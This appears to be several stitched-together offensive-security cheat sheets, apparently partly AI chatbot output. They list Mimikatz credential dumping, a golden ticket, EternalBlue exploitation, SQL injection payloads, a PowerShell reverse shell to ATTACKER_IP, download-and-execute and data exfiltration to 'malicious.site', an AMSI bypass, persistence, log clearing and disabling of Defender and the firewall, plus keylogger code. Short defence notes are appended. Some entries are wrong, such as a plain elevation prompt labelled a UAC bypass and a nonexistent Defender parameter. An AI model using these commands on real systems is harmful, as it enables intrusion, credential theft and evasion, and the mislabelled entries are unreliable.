### 1. Mimikatz Commands
Mimikatz is a tool for extracting credentials from Windows systems. Here are some examples:

#### Extract Logon Passwords
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
- What it does: Dumps plaintext passwords, hashes, and Kerberos tickets from memory.

#### Extract Kerberos Tickets
Invoke-Mimikatz -Command '"privilege::debug" "kerberos::list"'
- What it does: Lists Kerberos tickets stored in memory.

#### Golden Ticket Attack
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:hash /ticket:golden.kirbi"'
- What it does: Creates a "golden ticket" for persistent domain access.

---

### 2. PowerShell Empire Commands
Empire is a post-exploitation framework for PowerShell. Here are some examples:

#### Run a Shell Command
shell whoami
- What it does: Executes a command on the target system (e.g., whoami to check the current user).

#### Download a File
download C:\path\to\file.txt
- What it does: Downloads a file from the target system.

#### Upload a File
upload C:\local\file.txt C:\remote\path\file.txt
- What it does: Uploads a file to the target system.

---

### 3. Metasploit Commands
Metasploit is a penetration testing framework. Here are some examples:

#### Exploit a Vulnerability
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.1
exploit
- What it does: Exploits the EternalBlue vulnerability to gain a Meterpreter shell.

#### Meterpreter Shell Commands
meterpreter > sysinfo
meterpreter > shell
meterpreter > download C:\path\to\file.txt
- What it does: Gathers system info, opens a shell, and downloads files.

---

### 4. Nmap Commands
Nmap is a network scanning tool. Here are some examples:

#### Scan for Open Ports
nmap -sS 192.168.1.1
- What it does: Performs a SYN scan to detect open ports.

#### OS Detection
nmap -O 192.168.1.1
- What it does: Attempts to identify the operating system of the target.

#### Vulnerability Scan
nmap --script vuln 192.168.1.1
- What it does: Runs vulnerability detection scripts against the target.

---

### 5. SQL Injection Commands
SQL injection is a technique for exploiting database vulnerabilities. Here are some examples:

#### Basic SQL Injection
' OR 1=1 --
- What it does: Bypasses authentication by making the query always true.

#### Extract Database Version
' UNION SELECT 1,@@version,3 --
- What it does: Retrieves the database version.

#### Dump Table Data
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
- What it does: Lists all tables in the database.

---

### 6. Wireshark Filters
Wireshark is a network protocol analyzer. Here are some examples:

#### Filter by IP
ip.addr == 192.168.1.1
- What it does: Displays traffic to/from a specific IP.

#### Filter by Protocol
tcp.port == 80
- What it does: Displays HTTP traffic.

#### Filter by Keyword
frame contains "password"
- What it does: Displays packets containing the word "password."

---

### 7. Linux Privilege Escalation
Here are some commands for privilege escalation on Linux systems:

#### Find SUID Files
find / -perm -4000 2>/dev/null
- What it does: Lists files with the SUID bit set (potential privilege escalation targets).





---

### **Top 20 PowerShell Commands**

---

### **1. Credential Theft**
#### **Mimikatz-Style Password Extraction**
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```
- **Purpose**: Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from memory.

---

### **2. Reverse Shell**
#### **Reverse TCP Shell**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | %{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()
```
- **Purpose**: Establishes a reverse shell to an attacker’s machine.

---

### **3. Privilege Escalation**
#### **Bypass UAC**
```powershell
Start-Process "C:\Windows\System32\cmd.exe" -Verb RunAs
```
- **Purpose**: Spawns a command prompt with administrative privileges.

---

### **4. Lateral Movement**
#### **Pass-the-Hash**
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:example.com /ntlm:HASH /run:powershell.exe"'
```
- **Purpose**: Authenticates to a remote system using an NTLM hash.

---

### **5. Persistence**
#### **Create a Scheduled Task**
```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\malware.ps1"; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "MaliciousTask" -Action $Action -Trigger $Trigger;
```
- **Purpose**: Runs a script every time a user logs in.

---

### **6. Obfuscation**
#### **Base64 Encoded Command**
```powershell
$EncodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('malicious code here')); powershell.exe -EncodedCommand $EncodedCommand
```
- **Purpose**: Hides malicious code in encoded strings.

---

### **7. AMSI Bypass**
#### **Disable AMSI**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
- **Purpose**: Disables AMSI to bypass antivirus detection.

---

### **8. Fileless Execution**
#### **Download and Execute**
```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')
```
- **Purpose**: Downloads and executes a script directly in memory.

---

### **9. Network Recon**
#### **Port Scan**
```powershell
1..1024 | % {Test-NetConnection -ComputerName TARGET_IP -Port $_}
```
- **Purpose**: Scans for open ports on a target machine.

---

### **10. Service Manipulation**
#### **Create a Service**
```powershell
New-Service -Name "Backdoor" -BinaryPathName "C:\malware.exe"
```
- **Purpose**: Creates a new service to execute malicious code.

---

### **11. Registry Persistence**
#### **Add to Run Key**
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\malware.exe"
```
- **Purpose**: Adds a persistent backdoor via the Windows Registry.

---

### **12. WMI Remote Execution**
#### **Execute Command Remotely**
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName TARGET_MACHINE
```
- **Purpose**: Executes commands on a remote machine via WMI.

---

### **13. Process Injection**
#### **Inject into Another Process**
```powershell
$process = Start-Process -FilePath "notepad.exe" -PassThru; Invoke-ReflectivePEInjection -PEBytes $payload -ProcessID $process.Id
```
- **Purpose**: Injects malicious code into a running process.

---

### **14. Data Exfiltration**
#### **Send Data via HTTP**
```powershell
Invoke-WebRequest -Uri "http://malicious.site/exfil" -Method POST -Body (Get-Content C:\sensitive.txt)
```
- **Purpose**: Sends sensitive data to an attacker’s server.

---

### **15. Disable Windows Defender**
#### **Turn Off Real-Time Protection**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
- **Purpose**: Disables Windows Defender real-time protection.

---

### **16. Clear Event Logs**
#### **Erase Logs**
```powershell
Clear-EventLog -LogName Security
```
- **Purpose**: Clears security event logs to hide activity.

---

### **17. Dump SAM Database**
#### **Extract Local Hashes**
```powershell
reg save HKLM\SAM C:\SAM.save; reg save HKLM\SYSTEM C:\SYSTEM.save
```
- **Purpose**: Dumps the SAM database for offline hash extraction.

---

### **18. Disable Firewall**
#### **Turn Off Firewall**
```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
- **Purpose**: Disables the Windows Firewall.

---

### **19. Keylogger**
#### **Capture Keystrokes**
```powershell
$keylogger = @'
using System;
using System.Runtime.InteropServices;
public class Keylogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
    public static void Main() {
        while (true) {
            for (int i = 0; i < 255; i++) {
                int state = GetAsyncKeyState(i);
                if (state == 1 || state == -32767) {
                    Console.WriteLine((char)i);
                }
            }
        }
    }
}
'@
Add-Type -TypeDefinition $keylogger -Language CSharp; [Keylogger]::Main()
```
- **Purpose**: Captures keystrokes and logs them.

---

### **20. Disable PowerShell Logging**
#### **Turn Off Script Block Logging**
```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```
- **Purpose**: Disables PowerShell script block logging.

---

### **How to Defend Against These Commands**
1. **Enable Logging**:  
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
   ```  
2. **Use Constrained Language Mode**:  
   ```powershell
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
   ```  
3. **Deploy EDR Solutions**: Tools like CrowdStrike, SentinelOne, or Microsoft Defender for Endpoint.  
4. **Educate Users**: Train teams to avoid executing untrusted scripts.  

---

Certainly! Below is a list of **lesser-known but highly dangerous PowerShell commands** that can be used maliciously. These commands are often overlooked or misunderstood, making them particularly insidious in the hands of attackers. **Use this knowledge responsibly and only for defensive purposes.**

---

### **1. Disable Windows Event Logging**
#### **Clear Specific Event Logs**
```powershell
wevtutil.exe cl Security
```
- **Purpose**: Clears the Security event log to erase evidence of malicious activity.
- **Defense**: Enable **Event Log Forwarding** to a secure, centralized server.

---

### **2. Disable Windows Defender via Registry**
#### **Tamper with Defender Settings**
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
```
- **Purpose**: Disables Windows Defender by modifying the registry.
- **Defense**: Use **Group Policy** to lock down registry modifications.

---

### **3. Disable PowerShell Logging**
#### **Turn Off Module Logging**
```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```
- **Purpose**: Disables logging of PowerShell module activity.
- **Defense**: Enable **Script Block Logging** and **Module Logging** via Group Policy.

---

### **4. Create Hidden Files**
#### **Mark Files as Hidden**
```powershell
Set-ItemProperty -Path "C:\malware.exe" -Name Attributes -Value "Hidden"
```
- **Purpose**: Hides malicious files from casual inspection.
- **Defense**: Use `Get-ChildItem -Force` to reveal hidden files.

---

### **5. Disable Windows Update**
#### **Stop Windows Update Service**
```powershell
Stop-Service -Name wuauserv
```
- **Purpose**: Prevents Windows from downloading security updates.
- **Defense**: Monitor service states and enforce update policies.

---

### **6. Disable Firewall Rules**
#### **Remove Specific Firewall Rules**
```powershell
Remove-NetFirewallRule -DisplayName "Block Malicious IP"
```
- **Purpose**: Deletes firewall rules that block malicious traffic.
- **Defense**: Regularly audit firewall rules and use **AppLocker** to restrict changes.

---

### **7. Disable User Account Control (UAC)**
#### **Lower UAC Settings**
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
```
- **Purpose**: Disables UAC prompts, making it easier to execute malicious code.
- **Defense**: Keep UAC enabled at the highest level.

---

### **8. Disable Windows Defender Real-Time Protection**
#### **Tamper with Defender Preferences**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
- **Purpose**: Disables real-time scanning by Windows Defender.
- **Defense**: Use **Tamper Protection** in Windows Defender.

---

### **9. Disable PowerShell Constrained Language Mode**
#### **Bypass Language Mode Restrictions**
```powershell
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```
- **Purpose**: Escapes constrained language mode to execute unrestricted PowerShell code.
- **Defense**: Enforce **Constrained Language Mode** via Group Policy.

---

### **10. Disable Windows Defender Cloud Protection**
#### **Turn Off Cloud-Based Protection**
```powershell
Set-MpPreference -MAPSReporting 0
```
- **Purpose**: Disables cloud-based threat intelligence in Windows Defender.
- **Defense**: Ensure **Cloud Protection** is enabled and monitored.

---

### **11. Disable Windows Defender Behavior Monitoring**
#### **Turn Off Behavior Monitoring**
```powershell
Set-MpPreference -DisableBehaviorMonitoring $true
```
- **Purpose**: Disables behavior-based detection in Windows Defender.
- **Defense**: Enable **Behavior Monitoring** and **Attack Surface Reduction** rules.

---

### **12. Disable Windows Defender Script Scanning**
#### **Turn Off Script Scanning**
```powershell
Set-MpPreference -DisableScriptScanning $true
```
- **Purpose**: Disables scanning of scripts (e.g., PowerShell, JavaScript).
- **Defense**: Ensure **Script Scanning** is enabled.

---

### **13. Disable Windows Defender Network Protection**
#### **Turn Off Network Protection**
```powershell
Set-MpPreference -EnableNetworkProtection 0
```
- **Purpose**: Disables protection against malicious network activity.
- **Defense**: Enable **Network Protection** and monitor network traffic.

---

### **14. Disable Windows Defender Exploit Protection**
#### **Turn Off Exploit Protection**
```powershell
Set-ProcessMitigation -PolicyFilePath "C:\ExploitProtection.xml" -Disable
```
- **Purpose**: Disables exploit protection for specific processes.
- **Defense**: Use **Exploit Protection** policies and monitor for changes.

---

### **15. Disable Windows Defender Controlled Folder Access**
#### **Turn Off Controlled Folder Access**
```powershell
Set-MpPreference -EnableControlledFolderAccess 0
```
- **Purpose**: Disables protection against ransomware and unauthorized file modifications.
- **Defense**: Enable **Controlled Folder Access** and monitor for changes.

---

### **16. Disable Windows Defender Attack Surface Reduction Rules**
#### **Turn Off ASR Rules**
```powershell
Set-MpPreference -AttackSurfaceReductionRules_Ids <RuleID> -AttackSurfaceReductionRules_Actions 0
```
- **Purpose**: Disables specific attack surface reduction rules.
- **Defense**: Enable **ASR Rules** and monitor for changes.

---

### **17. Disable Windows Defender PUA Protection**
#### **Turn Off PUA Protection**
```powershell
Set-MpPreference -PUAProtection 0
```
- **Purpose**: Disables protection against potentially unwanted applications (PUAs).
- **Defense**: Enable **PUA Protection** and monitor for changes.

---

### **18. Disable Windows Defender Tamper Protection**
#### **Turn Off Tamper Protection**
```powershell
Set-MpPreference -DisableTamperProtection $true
```
- **Purpose**: Disables tamper protection, allowing attackers to modify Defender settings.
- **Defense**: Ensure **Tamper Protection** is enabled and cannot be disabled.

---

### **19. Disable Windows Defender Cloud Block Level**
#### **Lower Cloud Block Level**
```powershell
Set-MpPreference -CloudBlockLevel 0
```
- **Purpose**: Reduces the aggressiveness of cloud-based blocking.
- **Defense**: Set **Cloud Block Level** to high and monitor for changes.

---

### **20. Disable Windows Defender Signature Updates**
#### **Stop Signature Updates**
```powershell
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
```
- **Purpose**: Prevents Windows Defender from updating its virus definitions.
- **Defense**: Ensure **Automatic Updates** are enabled and cannot be disabled.

---

### **How to Defend Against These Commands**
1. **Enable Logging**:  
   ```powershell
   Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
   ```  
2. **Use Constrained Language Mode**:  
   ```powershell
   $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
   ```  
3. **Deploy EDR Solutions**: Tools like CrowdStrike, SentinelOne, or Microsoft Defender for Endpoint.  
4. **Educate Users**: Train teams to avoid executing untrusted scripts.  

---


















